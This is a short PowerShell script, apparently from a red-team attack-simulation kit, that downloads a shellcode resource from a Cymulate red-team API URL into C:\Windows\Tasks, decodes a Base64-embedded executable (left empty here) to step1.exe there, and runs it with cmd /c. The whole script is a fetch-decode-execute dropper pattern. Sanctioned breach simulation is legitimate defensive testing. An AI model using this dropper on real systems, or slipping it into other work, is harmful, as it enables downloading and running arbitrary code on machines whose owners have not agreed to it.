# Replace the placeholders with actual values before execution
$payloadUrl = "https://app.cymulate.com/api/red-team/resource/echoShellcode.txt"
$base64Exe  = ''

# Generate a random file name for the downloaded payload
$rand        = [guid]::NewGuid().Guid
$payloadPath = "C:\Windows\Tasks\pyld-$rand.dat"

# Download the payload
Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath

# Decode the Base64-encoded executable and save it
$exePath = "C:\Windows\Tasks\step1.exe"
[IO.File]::WriteAllBytes($exePath, [Convert]::FromBase64String($base64Exe))

# Execute the decoded file and capture its output
# Using cmd /c prevents hanging on getchar() calls by disconnecting stdin
cmd /c $exePath
